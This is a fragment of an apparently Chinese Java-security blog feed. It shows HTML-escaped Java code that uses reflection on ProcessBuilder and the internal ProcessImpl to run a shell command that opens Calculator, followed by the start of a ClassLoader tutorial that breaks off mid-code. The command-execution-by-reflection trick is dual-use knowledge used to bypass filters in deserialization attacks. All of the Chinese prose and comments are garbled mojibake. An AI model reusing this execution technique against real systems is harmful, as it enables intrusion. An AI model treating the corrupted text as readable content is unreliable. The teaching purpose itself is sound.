punctuation&quot;&gt;.&lt;/span&gt;cmd&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;token class-name&quot;&gt;Method&lt;/span&gt; method1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; clazz&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getDeclaredMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;start&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        method1&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pb&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ReflectPB1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt; clazz &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;java.lang.ProcessBuilder&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Constructor&lt;/span&gt; constructor &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; clazz&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getConstructor&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;List&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;//å½“ä½¿ç”¨Listç±»å‹çš„æ„é€ å‚æ•°&lt;/span&gt;

        &lt;span class=&quot;token comment&quot;&gt;//newInstanceæ¥æ”¶çš„æ˜¯ä¸€ä¸ªObjectæ•°ç»„ï¼Œéœ€è¦è½¬åŒ–ä¸€ä¸‹&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;ProcessBuilder&lt;/span&gt; pb &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;ProcessBuilder&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; constructor&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;newInstance&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Arrays&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;asList&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;cmd&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;token class-name&quot;&gt;Method&lt;/span&gt; method1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; clazz&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getDeclaredMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;start&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        method1&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pb&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; args&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;ReflectProcessBuilder&lt;/span&gt; reflectProcessBuilder &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ReflectProcessBuilder&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;//        reflectProcessBuilder.ReflectPB0();&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;&lt;span class=&quot;token namespace&quot;&gt;reflectProcessBuilder&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;ReflectPB1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;ProcessImpl&quot;&gt;&lt;a href=&quot;#ProcessImpl&quot; class=&quot;headerlink&quot; title=&quot;ProcessImpl&quot;&gt;&lt;/a&gt;ProcessImpl&lt;/h2&gt;&lt;pre class=&quot;line-numbers language-java&quot; data-language=&quot;java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;relfectDemo&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lang&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;reflect&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Constructor&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lang&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;reflect&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Method&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;util&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;HashMap&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;util&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Map&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ReflectProcessImpl&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; cmd &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;sh&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;open /System/Applications/Calculator.app&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ReflectPI0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt; clazz &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;java.lang.ProcessImpl&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Method&lt;/span&gt; method &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; clazz&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getDeclaredMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;start&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Map&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ProcessBuilder&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Redirect&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;boolean&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        method&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;setAccessible&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Map&lt;/span&gt;&lt;span class=&quot;token generics&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt; map &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;ProcessBuilder&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Redirect&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; redirect &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; dir &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;.&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token comment&quot;&gt;//ç¬¬å››ä¸ªå‚æ•°dirä¸èƒ½ä¸ºç©ºï¼Œä¸ºç©ºä¼šå¤±è´¥ï¼Œè¡¨ç¤ºåœ¨å“ªä¸ªè·¯å¾„ä¸‹æ‰§è¡Œå‘½ä»¤&lt;/span&gt;
        method&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;cmd&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; map&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; dir&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; redirect&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; args&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;ReflectProcessImpl&lt;/span&gt; reflectProcess &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ReflectProcessImpl&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;&lt;span class=&quot;token namespace&quot;&gt;reflectProcess&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;ReflectPI0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="Java" scheme="https://jkme.github.io/categories/Java/"/>
    
    
  </entry>
  
  <entry>
    <title>Javaå®‰å…¨ç¬”è®°(1)-åå°„æœºåˆ¶</title>
    <link href="https://jkme.github.io/2022/03/22/java-reflection.html"/>
    <id>https://jkme.github.io/2022/03/22/java-reflection.html</id>
    <published>2022-03-21T16:00:00.000Z</published>
    <updated>2022-04-02T07:38:05.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x1-ç±»åŠ è½½å™¨-ClassLoader"><a href="#0x1-ç±»åŠ è½½å™¨-ClassLoader" class="headerlink" title="0x1. ç±»åŠ è½½å™¨: ClassLoader"></a>0x1. ç±»åŠ è½½å™¨: ClassLoader</h2><p>Javaæ˜¯ä¸€ä¸ªä¾èµ–äº<code>JVMï¼ˆJavaè™šæ‹Ÿæœº)</code>å®ç°çš„è·¨å¹³å°çš„å¼€å‘è¯­è¨€ï¼Œ<code>Java</code>ä¼šå…ˆé€šè¿‡ç¼–è¯‘å™¨å°†æºä»£ç è½¬æ¢ä¸ºJavaäºŒè¿›åˆ¶å­—èŠ‚ç ï¼Œä¸€èˆ¬æ˜¯ä¿å­˜åœ¨<code>.class</code>æ–‡ä»¶ä¸­ï¼Œä¹‹åé€šè¿‡<code>JVM</code>è§£é‡Šå™¨æ‰§è¡Œè¿™æ®µä»£ç ã€‚å­—èŠ‚ç æ–‡ä»¶ä¼šåŒ…å«å¾ˆå¤šClassä¿¡æ¯ï¼Œåœ¨JVMè§£é‡Šå™¨è¿è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œ<code>ClassLoader</code>å°±æ˜¯ç”¨æ¥åŠ è½½ç±»çš„ï¼Œå®ƒä¼šå°†Javaå­—èŠ‚ç ä¸­çš„ClassåŠ è½½åˆ°å†…å­˜ä¸­ï¼Œè€Œæ¯ä¸ª<code>Class</code>å¯¹è±¡å†…éƒ¨éƒ½æœ‰ä¸€ä¸ª<code>ClassLoader</code>å±æ€§æ ‡è¯†ç”±å“ªä¸ª<code>ClassLoader</code>åŠ è½½ã€‚</p><h3 id="å¸¸è§çš„ClassLoader"><a href="#å¸¸è§çš„ClassLoader" class="headerlink" title="å¸¸è§çš„ClassLoader"></a>å¸¸è§çš„ClassLoader</h3><p>ä¸€åˆ‡çš„<code>Java</code>ç±»éƒ½å¿…é¡»ç»è¿‡JVMåŠ è½½ä¹‹åæ‰å¯ä»¥è¿è¡Œï¼Œæœ€å¸¸è§çš„<code>ClassLoader</code>ï¼š <code>BootstrapClassLoader</code>ã€<code>ExtensionClassLoader</code>ã€<code>AppClassLoader</code>ã€<code>URLClassLoader</code>ã€<code>ContextClassLoader</code></p><h4 id="BootstrapClassLoader"><a href="#BootstrapClassLoader" class="headerlink" title="BootstrapClassLoader"></a>BootstrapClassLoader</h4><p>JVMå†…ç½®çš„é»˜è®¤<code>classLoader</code>,è´Ÿè´£åŠ è½½JVMè¿è¡Œæ—¶çš„æ ¸å¿ƒç±»ï¼Œä½äº<code>JAVA_HOME/lib/rt.jar/</code>æ–‡ä»¶å¤¹ä¸­ï¼Œç”±Cä»£ç å®ç°ï¼Œ<code>Bootstrap ClassLoader</code>ç±»åŠ è½½å™¨æ‰€åŠ è½½çš„ç±»çš„ClassLoaderæ—¶å€™éƒ½ä¼šè¿”å›null</p><h4 id="ExtClassLoader"><a href="#ExtClassLoader" class="headerlink" title="ExtClassLoader"></a>ExtClassLoader</h4><p>æ‰©å±•ç±»åŠ è½½å™¨ï¼Œè´Ÿè´£åŠ è½½ JVM æ‰©å±•ç±»ï¼Œæ‰©å±• jar åŒ…ä½äº <code>JAVA_HOME/lib/ext/*.jar</code> ä¸­ï¼Œåº“åé€šå¸¸ä»¥ javax å¼€å¤´</p><h4 id="AppClassLoader"><a href="#AppClassLoader" class="headerlink" title="AppClassLoader"></a>AppClassLoader</h4><p>åº”ç”¨ç±»åŠ è½½å™¨/ç³»ç»Ÿç±»åŠ è½½å™¨ï¼Œç›´æ¥æä¾›ç»™ç”¨æˆ·ä½¿ç”¨çš„ClassLoaderï¼Œå®ƒä¼šåŠ è½½<code>ClASSPATH</code>ç¯å¢ƒå˜é‡æˆ–è€…<code>java.class.path</code>å±æ€§é‡Œå®šä¹‰çš„è·¯å¾„ä¸­çš„jaråŒ…å’Œç›®å½•ï¼Œæˆ‘ä»¬è‡ªå·±ç¼–å†™å’Œä½¿ç”¨çš„ç¬¬ä¸‰æ–¹JaråŒ…é€šå¸¸éƒ½æ˜¯ç”±å®ƒæ¥åŠ è½½</p><h4 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h4><p>ClassLoaderæŠ½è±¡ç±»çš„ä¸€ç§å®ç°ï¼Œå®ƒå¯ä»¥æ ¹æ®URLæœç´¢ç±»æˆ–èµ„æºï¼Œå¹¶è¿›è¡Œè¿œç¨‹åŠ è½½ã€‚</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">demo1</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JavaClassLoader</span> <span class="token punctuation">&#123;</span>    <span class="token 